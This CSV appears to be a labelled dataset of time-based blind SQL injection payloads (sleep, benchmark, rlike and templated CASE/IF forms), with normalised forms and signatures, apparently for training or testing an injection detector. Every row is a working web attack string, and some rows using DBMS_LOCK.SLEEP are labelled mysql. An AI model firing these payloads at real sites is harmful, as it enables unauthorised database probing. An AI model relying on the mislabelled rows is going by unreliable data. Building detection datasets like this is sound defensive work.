id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
25067,"1%"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""%"" = """,time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""%"" = """,False,0,"__INT__ % ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( % __STR__",290e5163,silver
2306,1' ) and sleep ( 5 ) and ( 'njud' = 'njud,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) and sleep ( 5 ) and ( 'njud' = 'njud,False,0,__INT__ ) and sleep ( __INT__ ) and ( __IDENT__,29f3801b,silver
19480,"1"" ) and sleep ( 5 ) and ( ""ytof"" = ""ytof",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) and sleep ( 5 ) and ( ""ytof"" = ""ytof",False,0,__INT__ ) and sleep ( __INT__ ) and ( __IDENT__,29f3801b,silver
20061,1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl,False,0,__INT__ ) and sleep ( __INT__ ) and ( __IDENT__,29f3801b,silver
20077,1' ) and sleep ( 5 ) and ( 'orxt' = 'orxt,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) and sleep ( 5 ) and ( 'orxt' = 'orxt,False,0,__INT__ ) and sleep ( __INT__ ) and ( __IDENT__,29f3801b,silver
24662,"1"" ) and sleep ( 5 ) and ( ""fsuf"" like ""fsuf",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) and sleep ( 5 ) and ( ""fsuf"" like ""fsuf",False,0,__INT__ ) and sleep ( __INT__ ) and ( __IDENT__,29f3801b,silver
25182,"1' ) where 6248 = 6248 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) where 6248 = 6248 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__' ) where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",2b040eab,silver
24267,1%' ) ) ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1%' ) ) ) rlike sleep ( 5 ) #,False,0,__INT__ % ' ) ) ) rlike sleep ( __INT__ ) #,2b270e8e,silver
19696,"1"" ) as gjlv where 1983 = 1983 and sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) as gjlv where 1983 = 1983 and sleep ( 5 ) #",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) #",2bbca2d8,silver
706,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg",False,0,__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,2e24bb76,silver
1493,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'rozr' like 'rozr,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'rozr' like 'rozr,False,0,__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,2e24bb76,silver
21114,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",False,0,__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,2e24bb76,silver
22547,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'zwyx' = 'zwyx,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'zwyx' = 'zwyx,False,0,__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,2e24bb76,silver
23881,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'svuu' = 'svuu,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'svuu' = 'svuu,False,0,__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,2e24bb76,silver
21993,"1 where 1842 = 1842 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1 where 1842 = 1842 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",2f8311c2,silver
22235,"1"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__"" ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",2fd7861f,silver
852,1' ) as xiqw where 8507 = 8507 rlike sleep ( 5 ) --,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1' ) as xiqw where 8507 = 8507 rlike sleep ( 5 ) --,False,0,__INT__' ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --,315e8da1,silver
20679,1%' and sleep ( 5 ) and '%' = ',time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1%' and sleep ( 5 ) and '%' = ',False,0,__INT__ % and sleep ( __INT__ ) and % __STR__,31693d9b,silver
23482,"1%"" and sleep ( 5 ) and ""%"" = """,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%"" and sleep ( 5 ) and ""%"" = """,False,0,__INT__ % and sleep ( __INT__ ) and % __STR__,31693d9b,silver
1348,1 ) or sleep ( 5 ),time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 ) or sleep ( 5 ),False,0,__INT__ ) or sleep ( __INT__ ),325ca406,silver
22549,"1"" ) as zjwu where 9963 = 9963 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) as zjwu where 9963 = 9963 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",3391e2a0,silver
21845,"1"" ) as ybkp where 7788 = 7788 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) as ybkp where 7788 = 7788 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",34288720,silver
1244,"1' in boolean mode ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' in boolean mode ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) #",False,0,"__INT__' in __IDENT__ __IDENT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",342ed01e,silver
23287,"1' in boolean mode ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' in boolean mode ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__' in __IDENT__ __IDENT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",342ed01e,silver
20680,"1"" or sleep ( 5 ) and ""telb"" = ""telb",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" or sleep ( 5 ) and ""telb"" = ""telb",False,0,__INT__ or sleep ( __INT__ ) and __IDENT__,357307a8,silver
21219,1' or sleep ( 5 ) and 'rpqn' like 'rpqn,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' or sleep ( 5 ) and 'rpqn' like 'rpqn,False,0,__INT__ or sleep ( __INT__ ) and __IDENT__,357307a8,silver
22295,1' or sleep ( 5 ) and 'yudo' = 'yudo,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' or sleep ( 5 ) and 'yudo' = 'yudo,False,0,__INT__ or sleep ( __INT__ ) and __IDENT__,357307a8,silver
23174,1' or sleep ( 5 ) and 'udqz' = 'udqz,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' or sleep ( 5 ) and 'udqz' = 'udqz,False,0,__INT__ or sleep ( __INT__ ) and __IDENT__,357307a8,silver
24787,"1"" or sleep ( 5 ) and ""fbuo"" like ""fbuo",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" or sleep ( 5 ) and ""fbuo"" like ""fbuo",False,0,__INT__ or sleep ( __INT__ ) and __IDENT__,357307a8,silver
21948,1 ) where 1100 = 1100 and sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 ) where 1100 = 1100 and sleep ( 5 ) --,False,0,__INT__ ) where __INT__ = __INT__ and sleep ( __INT__ ) --,3804c1d2,silver
1944,1' and sleep ( 5 ),time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' and sleep ( 5 ),False,0,__INT__' and sleep ( __INT__ ),383f1b5b,silver
21093,1' where 5455 = 5455 and sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' where 5455 = 5455 and sleep ( 5 ) --,False,0,__INT__' where __INT__ = __INT__ and sleep ( __INT__ ) --,38927f5e,silver
21437,begin user_lock.sleep ( 5 ),time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,begin user_lock.sleep ( 5 ),False,0,__IDENT__ __IDENT__ . sleep ( __INT__ ),392f39cf,silver
20070,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",False,0,"__INT__"" and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) )",39e0dbf8,silver
834,"1"" and sleep ( 5 ) and ""tdid"" like ""tdid",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" and sleep ( 5 ) and ""tdid"" like ""tdid",False,0,__INT__ and sleep ( __INT__ ) and __IDENT__,3a681457,silver
1327,1' and sleep ( 5 ) and 'usgv' like 'usgv,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' and sleep ( 5 ) and 'usgv' like 'usgv,False,0,__INT__ and sleep ( __INT__ ) and __IDENT__,3a681457,silver
21600,"1"" and sleep ( 5 ) and ""masm"" = ""masm",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" and sleep ( 5 ) and ""masm"" = ""masm",False,0,__INT__ and sleep ( __INT__ ) and __IDENT__,3a681457,silver
24165,1' and sleep ( 5 ) and 'kapr' = 'kapr,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' and sleep ( 5 ) and 'kapr' = 'kapr,False,0,__INT__ and sleep ( __INT__ ) and __IDENT__,3a681457,silver
25505,1' and sleep ( 5 ) and 'pfgy' = 'pfgy,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' and sleep ( 5 ) and 'pfgy' = 'pfgy,False,0,__INT__ and sleep ( __INT__ ) and __IDENT__,3a681457,silver
161,""" ) or sleep ( __TIME__ ) = """,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,""" ) or sleep ( __TIME__ ) = """,False,0,) or sleep ( __time__ ) =,3b83aec7,silver
25358,"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",False,0,"__INT__' ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) )",3c65d978,silver
21518,"1%' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__ % ' ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",3f2631e9,silver
21537,1 ) as mixt where 1085 = 1085 or sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 ) as mixt where 1085 = 1085 or sleep ( 5 ) --,False,0,__INT__ ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) --,3f3deab8,silver
22005,1' where 1652 = 1652 and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' where 1652 = 1652 and sleep ( 5 ) #,False,0,__INT__' where __INT__ = __INT__ and sleep ( __INT__ ) #,4062f44b,silver
385,"1"" ) ) as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",409659fe,silver
21685,"1%' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",False,0,"__INT__ % ' ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",418509d2,silver
24420,"1"" ) as cnrh where 8524 = 8524 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) as cnrh where 8524 = 8524 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",41ade20c,silver
23852,1' where 4403 = 4403 rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1' where 4403 = 4403 rlike sleep ( 5 ) #,False,0,__INT__' where __INT__ = __INT__ rlike sleep ( __INT__ ) #,43e2e9b8,silver
1581,1' ) ) and sleep ( 5 ) and ( ( 'jiio' like 'jiio,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) ) and sleep ( 5 ) and ( ( 'jiio' like 'jiio,False,0,__INT__ ) ) and sleep ( __INT__ ) and ( ( __IDENT__,449fa8b4,silver
21057,"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",False,0,__INT__ ) ) and sleep ( __INT__ ) and ( ( __IDENT__,449fa8b4,silver
21802,1' ) ) and sleep ( 5 ) and ( ( 'tcwt' = 'tcwt,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) ) and sleep ( 5 ) and ( ( 'tcwt' = 'tcwt,False,0,__INT__ ) ) and sleep ( __INT__ ) and ( ( __IDENT__,449fa8b4,silver
21931,"1"" ) ) and sleep ( 5 ) and ( ( ""lied"" like ""lied",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) ) and sleep ( 5 ) and ( ( ""lied"" like ""lied",False,0,__INT__ ) ) and sleep ( __INT__ ) and ( ( __IDENT__,449fa8b4,silver
22429,1' ) ) and sleep ( 5 ) and ( ( 'krrr' = 'krrr,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1' ) ) and sleep ( 5 ) and ( ( 'krrr' = 'krrr,False,0,__INT__ ) ) and sleep ( __INT__ ) and ( ( __IDENT__,449fa8b4,silver
374,"1' ) ) as bedq where 8781 = 8781 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) ) as bedq where 8781 = 8781 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",False,0,"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",451bd50d,silver
351,"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""jozh"" = ""jozh",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""jozh"" = ""jozh",False,0,"__INT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __IDENT__",45e0a30d,silver
1864,"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""vxec"" like ""vxec",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""vxec"" like ""vxec",False,0,"__INT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __IDENT__",45e0a30d,silver
2404,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'urxs' = 'urxs",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'urxs' = 'urxs",False,0,"__INT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __IDENT__",45e0a30d,silver
24626,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'mhvy' like 'mhvy",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'mhvy' like 'mhvy",False,0,"__INT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __IDENT__",45e0a30d,silver
25610,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'seyd' = 'seyd",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'seyd' = 'seyd",False,0,"__INT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __IDENT__",45e0a30d,silver
40391,([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME])) ([INFERENCE] AND SLEEP([SLEEPTIME])),time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 81 chars.,2,([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME])) ([INFERENCE] AND SLEEP([SLEEPTIME])),False,0,( [__IDENT__] = [__IDENT__] and sleep ( [__IDENT__] ) ) ( [__IDENT__] and sleep ( [__IDENT__] ) ),45f0a8b1,silver
40387,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END) (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END),time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 145 chars.,2,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END) (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END),False,0,( case when ( [__IDENT__] = [__IDENT__] ) then sleep ( [__IDENT__] ) else [__IDENT__] end ) ( case when ( [__IDENT__] ) then sleep ( [__IDENT__] ) else [__IDENT__] end ),4607dbc1,silver
24282,"1%"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1%"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,"__INT__ % "" ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",46745797,silver
1888,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'hmqq' = 'hmqq",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'hmqq' = 'hmqq",False,0,"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",474c4cde,silver
19217,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'pbin' = 'pbin",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'pbin' = 'pbin",False,0,"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",474c4cde,silver
22443,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""tqbi"" = ""tqbi",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""tqbi"" = ""tqbi",False,0,"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",474c4cde,silver
24169,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""mynm"" like ""mynm",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""mynm"" like ""mynm",False,0,"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",474c4cde,silver
25484,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'vmuj' like 'vmuj",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'vmuj' like 'vmuj",False,0,"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",474c4cde,silver
22272,1%' ) ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1,1%' ) ) rlike sleep ( 5 ) #,False,0,__INT__ % ' ) ) rlike sleep ( __INT__ ) #,495a728c,silver
19689,1%' and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1%' and sleep ( 5 ) #,False,0,__INT__ % ' and sleep ( __INT__ ) #,495dc983,silver
40397,BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END; BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;,time_blind,mysql,0.7,Time-blind SQLi (sleep/delay function); DB: mysql. Payload length: 199 chars.,2,BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END; BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;,False,0,__IDENT__ if ( [__IDENT__] = [__IDENT__] ) then dbms_lock . sleep ( [__IDENT__] ) ; else dbms_lock . sleep ( __INT__ ) ; end if ; end ; __IDENT__ if ( [__IDENT__] ) then dbms_lock . sleep ( [__IDENT__] ) ; else dbms_lock . sleep ( __INT__ ) ; end if ; end ;,4a6d7e55,silver
122,1 ) or sleep ( __TIME__ ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1,1 ) or sleep ( __TIME__ ) #,False,0,__INT__ ) or sleep ( __time__ ) #,4a814267,silver
